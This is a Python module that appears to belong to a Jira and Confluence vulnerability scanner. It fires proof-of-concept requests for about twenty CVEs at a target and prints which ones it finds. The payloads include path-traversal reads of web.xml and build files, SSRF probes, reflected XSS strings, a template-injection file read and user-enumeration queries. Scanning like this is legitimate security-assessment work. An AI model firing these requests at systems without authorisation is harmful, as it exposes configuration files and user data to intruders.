import requests
import json
import shutil
import sys

from colorama import Fore, Back, Style

from ..support.args import parser

class ActiveJira:
    def __init__(self):
        args = parser()
        self.target = args.target
    
    def tidy_url(target):
        if target.endswith('/'):
            target = target[:-1]
        return target
    
    def size():
        return shutil.get_terminal_size().columns
    
    def headline(self):
        size = ActiveJira.size()
        print(Fore.GREEN + Style.BRIGHT + '-' * size + '\n' + 'ACTIVE-SCAN-RESULT'.center(size) + '\n' + '-' * size + Style.RESET_ALL + '\n')
        print(Fore.CYAN + "CVE-ID" + "\t\t\t" + "SEVERITY" + "\t" + "POC-URL" + Style.RESET_ALL + '\n')

    def cve_2017_9506(self, target):
        poc = target + '/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.google.com'
        response = requests.get(poc)
        if b'<title>Google</title>' in response.content:
            print("CVE-2017-9506" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")
            
    def cve_2019_3403(self, target, user):
        poc = target + f'/rest/api/latest/user/picker?query={user}'
        response = requests.get(poc)
        if b'Showing' in response.content and response.status_code == 200:
            print("CVE-2019-3403" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")
    
    def cve_2019_8446(self, target, user):
        poc = target + '/rest/issueNav/1/issueTable'
        headers = {'X-Atlassian-token' : 'no-check'}
        response = requests.post(poc, headers=headers, data=f'jql=project in projectsLeadByUser("{user}")')
        if b'the user does not exist' not in response.content and response.status_code == 200:
            print("CVE-2019-8446" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")
    
    def cve_2020_14179(self, target):
        poc = target + '/secure/QueryComponent!Default.jspa'
        response = requests.get(poc)
        if b"searchers" in response.content and response.status_code == 200:
            print("CVE-2020-14179" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")
        
    def cve_2019_8449(self, target, user):
        poc = target + f'/rest/api/latest/groupuserpicker?query={user}&maxResults=50000&showAvatar=true'
        response = requests.get(poc)
        if b'name' in response.content and response.status_code == 200:
            print("CVE-2019-8449" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")
    
    def cve_2020_14181(self, target, user):
        poc = target + f'/secure/ViewUserHover.jspa?username={user}'
        response = requests.get(poc)
        if b'User does not exist' in response.content and response.status_code == 200:
            print("CVE-2020-14181" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")
    
    def cve_2021_26085(self, target):
        poc = target + '/s/leet/_/;/WEB-INF/web.xml'
        response = requests.get(poc)
        if b'com.atlassian.confluence.setup.ConfluenceAppConfig' in response.content and response.status_code == 200:
            print("CVE-2021-26085" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")                     
    
    def cve_2018_20824(self, target):
        poc = target + '/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)'
        response = requests.get(poc)
        if b'alert(document.domain)' in response.content and response.status_code == 200:
            print("CVE-2018-20824" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")
    
    def cve_2019_3402(self, target):
        poc = target + '/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search'
        response = requests.get(poc)
        if b'<script>alert(1)</script>' in response.content and response.status_code == 200:
            print("CVE-2019-3402" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")
    
    def cve_2015_8399(self, target):
        poc = target + '/spaces/viewdefaultdecorator.action?decoratorName'
        response = requests.get(poc)
        if b'confluence-init.properties' in response.content and response.status_code == 200:
            print("CVE-2015-8399" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")  
    def cve_2021_26086(self, target):
        poc = target + '/s/leet/_/;/WEB-INF/web.xml'
        response = requests.get(poc)
        if b'<web-app' in response.content and response.status_code == 200:
            print("CVE-2021-26086" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")
    
    def cve_2020_36289(self, target, user):
        poc = target + f'/secure/QueryComponentRendererValue!Default.jspa?assignee=user:{user}'
        response = requests.get(poc)
        if b'rel=\\"admin\\"' in response.content and response.status_code == 200:
            print("CVE-2020-36289" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")
    
    def cve_2019_8442(self, target):
        poc1 = target + '/s/leet/_/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.properties'
        poc2 = target + '/s/leet/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties'
        response1 = requests.get(poc1)
        response2 = requests.get(poc2)
        
        if b'com.atlassian.jira' in response1.content and response1.status_code == 200:
            print("CVE-2019-8442" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc1}")
        elif b'com.atlassian.jira' in response2.content and response2.status_code == 200:
            print("CVE-2019-8442" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc2}")
    
    def cve_2019_3401(self, target):
        poc = target + '/secure/ManageFilters.jspa?filter=popular&filterView=popular'
        response = requests.get(poc)
        if b'<span data-filter-field="owner-full-name">' in response.content and b'<title>Manage Filters - Jira</title>' in response.content:
               print("CVE-2019-3401" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")
    
    def cve_2019_11581(self, target):
        poc = target + '/secure/ContactAdministrators!default.jspa'
        response = requests.get(poc)
        if b'has not yet configured this contact form' not in response.content and b'Contact Site Administrators' in response.content:
            print("CVE-2019-11581" + Fore.RED + "\t\t" + "CRITICAL" + Style.RESET_ALL + "\t" + f"{poc}")
    
    def cve_2019_3396(self, target):
        poc = target + '/rest/tinymce/1/macro/preview'
        response = requests.post(poc, data='{"contentId":"1","macro":{"name":"widget","body":"","params":{"url":"https://www.google.com","width":"1000","height":"1000","_template":"../web.xml"}}}')
        
        if b'<param-name>contextConfigLocation</param-name>' in response.content and response.status_code == 200:
            print("CVE-2019-3396" + Fore.RED + "\t\t" + "CRITICAL" + Style.RESET_ALL + "\t" + f"{poc}")
    
    def cve_2019_8451(self, target):
        poc = target + '/plugins/servlet/gadgets/makeRequest?url=https://google.com'
        response = requests.get(poc)
        if b'<title>Google</title>' in response.content and response.status_code == 200:
            print("CVE-2019-8451" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")

    def cve_2020_29453(self, target):
        poc1 = target + '/s/leet/_/%2e/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.properties'
        poc2 = target + '/s/leet/_/%2e/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties'
        
        response1 = requests.get(poc1)
        response2 = requests.get(poc2)
        if b'com.atlassian.jira' in response1.content and response1.status_code == 200:
            print("CVE-2020-29453" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc1}")
        elif b'com.atlassian.jira' in response2.content and response2.status_code == 200:
            print("CVE-2020-29453" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc2}") 
    
    def cve_2022_0540(self, target):
        poc = target + '/InsightPluginShowGeneralConfiguration.jspa;'
        response = requests.get(poc)
        
        if b'general configuration for the Insight plugin.' in response.content and response.status_code == 200:
            print("CVE-2022-0540" + Fore.RED + "\t\t" + "CRITICAL" + Style.RESET_ALL + "\t" + f"{poc}")
    
    def cve_2022_39960(self, target):
        poc = target + '/plugins/servlet/groupexportforjira/admin/json'
        headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
        response = requests.post(poc, headers=headers, data='groupexport_searchstring=&groupexport_download=true')
        
        if b'jiraGroupObjects' in response.content and response.status_code == 200:
            print("CVE-2022-39960" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")
   
if __name__ == '__main__':
    ActiveJira()